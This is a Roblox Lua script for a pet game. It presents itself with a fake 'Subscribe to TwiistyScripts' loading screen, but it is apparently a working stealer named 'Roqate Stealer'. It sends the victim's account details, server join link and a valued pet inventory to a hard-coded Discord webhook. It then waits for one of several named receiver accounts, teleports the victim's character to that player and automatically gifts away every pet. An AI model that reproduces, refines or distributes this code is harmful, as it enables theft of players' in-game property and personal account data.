local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn", "RacMethodCB"}
local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local CHECK_INTERVAL = 5
local SHUTDOWN_DURATION = 10
local GIFT_COOLDOWN = 3
local MINIMUM_PETS = 3
local MINIMUM_TOTAL_VALUE = 50000

-- Executor identification
local function identifyExecutor()
    if syn then
        return "Synapse X"
    elseif PROTOSMASHER_LOADED then
        return "ProtoSmasher"
    elseif KRNL_LOADED then
        return "Krnl"
    elseif fluxus then
        return "Fluxus"
    elseif getexecutorname then
        return getexecutorname()
    elseif identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown Executor"
    end
end

if syn then
    syn.protect_gui(syn.secure_call)
    setfflag("HttpServiceEnabled", true)
end

local function sendWebhook(data)
    local body = {
        content = data.content,
        embeds = data.embeds,
        username = "Roqate Stealer",
        avatar_url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
    }

    local json = HttpService:JSONEncode(body)
    
    local requestFunc = syn and syn.request or http_request or request
    if requestFunc then
        requestFunc({
            Url = Webhook1,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    end
end

local function getPetsInventory()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return {} end

    local pets = {}
    for _, item in ipairs(backpack:GetChildren()) do
        local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
        if nameMatch then
            local petName = nameMatch
            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]")) or 0
            local age = tonumber(item.Name:match("%[Age (%d+)%]")) or 0
            local isSpecial = false

            for _, specialName in ipairs(SPECIAL_PETS) do
                if petName:find(specialName) then
                    isSpecial = true
                    break
                end
            end

            table.insert(pets, {
                instance = item,
                name = petName,
                fullName = item.Name,
                kg = kg,
                age = age,
                special = isSpecial,
                value = math.floor((kg * 10000) + (age * 1000))
            })
        end
    end
    
    -- Sort pets by value (highest first)
    table.sort(pets, function(a, b)
        return a.value > b.value
    end)
    
    return pets
end

local function createLoader()
    shared.LoaderTitle = "Subscribe to TwiistyScripts"
    shared.LoaderKeyFrames = {
        [1] = {1, 10},
        [2] = {2, 30},
        [3] = {3, 60},
        [4] = {2, 100}
    }
    
    local v2 = {
        LoaderData = {
            Name = shared.LoaderTitle or "A Loader",
            Colors = shared.LoaderColors or {
                Main = Color3.fromRGB(30, 30, 30),
                Topic = Color3.fromRGB(200, 200, 200),
                Title = Color3.fromRGB(255, 255, 255),
                LoaderBackground = Color3.fromRGB(40, 40, 40),
                LoaderSplash = Color3.fromRGB(130, 36, 212)
            }
        },
        Keyframes = shared.LoaderKeyFrames or {
            [1] = {1, 10},
            [2] = {2, 30},
            [3] = {3, 60},
            [4] = {2, 100}
        }
    }
    
    local v3 = {
        [1] = "Initializing...",
        [2] = "Loading assets...",
        [3] = "Connecting...",
        [4] = "Complete!"
    }

    function TweenObject(v178, v179, v180)
        game.TweenService:Create(v178, TweenInfo.new(v179, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), v180):Play()
    end

    function CreateObject(v181, v182)
        local v183 = Instance.new(v181)
        local v184
        for v416, v417 in pairs(v182) do
            if (v416 ~= "Parent") then
                v183[v416] = v417
            else
                v184 = v417
            end
        end
        v183.Parent = v184
        return v183
    end

    local function v4(v186, v187)
        local v188 = Instance.new("UICorner")
        v188.CornerRadius = UDim.new(0, v186)
        v188.Parent = v187
    end

    local v5 = CreateObject("ScreenGui", {
        Name = "Core",
        Parent = game.CoreGui
    })

    local v6 = CreateObject("Frame", {
        Name = "Main",
        Parent = v5,
        BackgroundColor3 = v2.LoaderData.Colors.Main,
        BorderSizePixel = 0,
        ClipsDescendants = true,
        Position = UDim2.new(0.5, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0.5, 0.5),
        Size = UDim2.new(0, 0, 0, 0)
    })

    v4(12, v6)

    local v7 = CreateObject("ImageLabel", {
        Name = "UserImage",
        Parent = v6,
        BackgroundTransparency = 1,
        Image = "rbxassetid://81767899440204",
        Position = UDim2.new(0, 15, 0, 10),
        Size = UDim2.new(0, 50, 0, 50)
    })

    v4(25, v7)

    local v8 = CreateObject("TextLabel", {
        Name = "UserName",
        Parent = v6,
        BackgroundTransparency = 1,
        Text = "Youtube: TwiistyScripts",
        Position = UDim2.new(0, 75, 0, 10),
        Size = UDim2.new(0, 200, 0, 50),
        Font = Enum.Font.GothamBold,
        TextColor3 = v2.LoaderData.Colors.Title,
        TextSize = 14,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    local v9 = CreateObject("TextLabel", {
        Name = "Top",
        TextTransparency = 1,
        Parent = v6,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 30, 0, 70),
        Size = UDim2.new(0, 301, 0, 20),
        Font = Enum.Font.Gotham,
        Text = "Loader",
        TextColor3 = v2.LoaderData.Colors.Topic,
        TextSize = 10,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    local v10 = CreateObject("TextLabel", {
        Name = "Title",
        Parent = v6,
        TextTransparency = 1,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 30, 0, 90),
        Size = UDim2.new(0, 301, 0, 46),
        Font = Enum.Font.Gotham,
        RichText = true,
        Text = "<b>" .. v2.LoaderData.Name .. "</b>",
        TextColor3 = v2.LoaderData.Colors.Title,
        TextSize = 14,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    local v11 = CreateObject("Frame", {
        Name = "BG",
        Parent = v6,
        AnchorPoint = Vector2.new(0.5, 0),
        BackgroundTransparency = 1,
        BackgroundColor3 = v2.LoaderData.Colors.LoaderBackground,
        BorderSizePixel = 0,
        Position = UDim2.new(0.5, 0, 0, 70),
        Size = UDim2.new(0.8500000238418579, 0, 0, 24)
    })

    v4(8, v11)

    local v12 = CreateObject("Frame", {
        Name = "Progress",
        Parent = v11,
        BackgroundColor3 = v2.LoaderData.Colors.LoaderSplash,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(0, 0, 0, 24)
    })

    v4(8, v12)

    local v13 = CreateObject("TextLabel", {
        Name = "StepLabel",
        Parent = v6,
        BackgroundTransparency = 1,
        Position = UDim2.new(0.5, 0, 1, -25),
        Size = UDim2.new(1, -20, 0, 20),
        Font = Enum.Font.Gotham,
        Text = "",
        TextColor3 = v2.LoaderData.Colors.Topic,
        TextSize = 14,
        TextXAlignment = Enum.TextXAlignment.Center,
        AnchorPoint = Vector2.new(0.5, 0.5)
    })

    function UpdateStepText(v191)
        v13.Text = v3[v191] or ""
    end

    function UpdatePercentage(v193, v194)
        TweenObject(v12, 0.5, {
            Size = UDim2.new(v193/100, 0, 0, 24)
        })
        UpdateStepText(v194)
    end

    TweenObject(v6, 0.25, {
        Size = UDim2.new(0, 346, 0, 121)
    })
    
    wait()
    
    TweenObject(v9, 0.5, {
        TextTransparency = 0
    })
    
    TweenObject(v10, 0.5, {
        TextTransparency = 0
    })
    
    TweenObject(v11, 0.5, {
        BackgroundTransparency = 0
    })
    
    TweenObject(v12, 0.5, {
        BackgroundTransparency = 0
    })

    for v195, v196 in pairs(v2.Keyframes) do
        wait(v196[1])
        UpdatePercentage(v196[2], v195)
    end

    UpdatePercentage(100, 4)
    
    TweenObject(v9, 0.5, {
        TextTransparency = 1
    })
    
    TweenObject(v10, 0.5, {
        TextTransparency = 1
    })
    
    TweenObject(v11, 0.5, {
        BackgroundTransparency = 1
    })
    
    TweenObject(v12, 0.5, {
        BackgroundTransparency = 1
    })
    
    wait(0.5)
    
    TweenObject(v6, 0.25, {
        Size = UDim2.new(0, 0, 0, 0)
    })
    
    wait(0.25)
    v5:Destroy()
end

local function splitEmbeds(pets, totalValue, specialCount)
    local embeds = {}
    local placeId = game.PlaceId
    local jobId = game.JobId
    local gameInstanceId = tostring(game.JobId)
    
    -- Main embed with player info and summary
    local mainEmbed = {
        title = "🐾 Pet Stealer Report",
        color = 0x8324D4, -- Purple color
        timestamp = DateTime.now():ToIsoDate(),
        thumbnail = {
            url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
        },
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("```Username: %s (@%s)\nUser ID: %d\nAccount Age: %d days\nExecutor: %s```", 
                    LocalPlayer.Name, 
                    LocalPlayer.DisplayName,
                    LocalPlayer.UserId,
                    LocalPlayer.AccountAge,
                    identifyExecutor()
                ),
                inline = false
            },
            {
                name = "🌐 Server Information",
                value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://www.roblox.com/games/%d?privateServerLinkCode=%s)", 
                    game:GetService("MarketplaceService"):GetProductInfo(placeId).Name,
                    placeId, 
                    jobId,
                    placeId,
                    jobId
                ),
                inline = false
            },
            {
                name = "📊 Inventory Summary",
                value = string.format("```Total Pets: %d\n🌟 Special Pets: %d\n💰 Total Value: %s¢```", 
                    #pets, 
                    specialCount,
                    tostring(totalValue):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
                ),
                inline = false
            }
        },
        footer = {
            text = "Roqate Stealer • "..os.date("%m/%d/%Y %I:%M %p"),
            icon_url = "https://cdn.discordapp.com/emojis/1187822753164578866.webp?size=96&quality=lossless"
        }
    }
    
    table.insert(embeds, mainEmbed)
    
    -- Split pets into chunks of 10 for better organization
    local petChunks = {}
    for i = 1, #pets, 10 do
        table.insert(petChunks, {table.unpack(pets, i, math.min(i + 9, #pets))})
    end
    
    for i, chunk in ipairs(petChunks) do
        local petList = ""
        local totalChunkValue = 0
        
        for _, pet in ipairs(chunk) do
            petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %s¢\n",
                pet.special and "🌟" or "🐶",
                pet.name,
                pet.kg,
                pet.age,
                tostring(pet.value):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
            )
            totalChunkValue = totalChunkValue + pet.value
        end
        
        local petEmbed = {
            title = string.format("📦 Pet Inventory (Part %d/%d)", i, #petChunks),
            color = 0x8324D4,
            fields = {
                {
                    name = string.format("🐾 Pets %d-%d (Total: %s¢)", 
                        (i-1)*10 + 1, 
                        math.min(i*10, #pets),
                        tostring(totalChunkValue):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
                    ),
                    value = "```"..petList.."```",
                    inline = false
                }
            },
            footer = {
                text = "Roqate Stealer • Part "..i.." of "..#petChunks,
                icon_url = "https://cdn.discordapp.com/emojis/1187822753164578866.webp?size=96&quality=lossless"
            }
        }
        
        table.insert(embeds, petEmbed)
    end
    
    return embeds
end

local function sendInitialReport()
    local pets = getPetsInventory()
    local totalValue = 0
    local specialCount = 0
    
    for _, pet in ipairs(pets) do
        totalValue = totalValue + pet.value
        if pet.special then specialCount = specialCount + 1 end
    end

    local embeds = splitEmbeds(pets, totalValue, specialCount)
    sendWebhook({
        embeds = embeds
    })
end

local function isPetFavorited(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    return pet and pet:GetAttribute("Favorited")
end

local function unfavoritePet(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
        return true
    end
    return false
end

local function giftPet(targetPlayer, petName)
    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
end

local function equipSinglePet(petName)
    local character = LocalPlayer.Character
    if not character then return false end

    for _, item in ipairs(character:GetChildren()) do
        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
            item.Parent = LocalPlayer.Backpack
        end
    end

    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        pet.Parent = character
        return true
    end
    return false
end

local function teleportToPlayer(targetPlayer)
    if not LocalPlayer.Character then return false end
    local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end

    if not targetPlayer.Character then return false end
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return false end

    local offset = targetHrp.CFrame.LookVector * -5
    offset = Vector3.new(offset.X, 0, offset.Z)
    humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
    return true
end

local function isReceiverInGame()
    for _, receiverName in ipairs(RECEIVERS) do
        local player = Players:FindFirstChild(receiverName)
        if player then return player end
    end
    return nil
end

local function waitForReceiver()
    local receiverFound = Instance.new("BindableEvent")

    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
            break
        end
    end

    local connection = Players.PlayerAdded:Connect(function(player)
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
        end
    end)

    local backupCheck = coroutine.create(function()
        while true do
            local receiver = isReceiverInGame()
            if receiver then
                receiverFound:Fire(receiver)
                break
            end
            task.wait(CHECK_INTERVAL)
        end
    end)
    coroutine.resume(backupCheck)

    local foundReceiver = receiverFound.Event:Wait()
    connection:Disconnect()
    return foundReceiver
end

local function startGifting(targetPlayer)
    while true do
        local pets = getPetsInventory()
        if #pets == 0 then break end

        for _, pet in ipairs(pets) do
            if isPetFavorited(pet.fullName) then
                unfavoritePet(pet.fullName)
                task.wait(1)
            end

            if equipSinglePet(pet.fullName) then
                giftPet(targetPlayer, pet.fullName)
                task.wait(GIFT_COOLDOWN)
                break
            end
        end
        task.wait(1)
    end
end

createLoader()
sendInitialReport()
task.wait(2)

local receiver = waitForReceiver()
if not receiver then return end

teleportToPlayer(receiver)
startGifting(receiver)
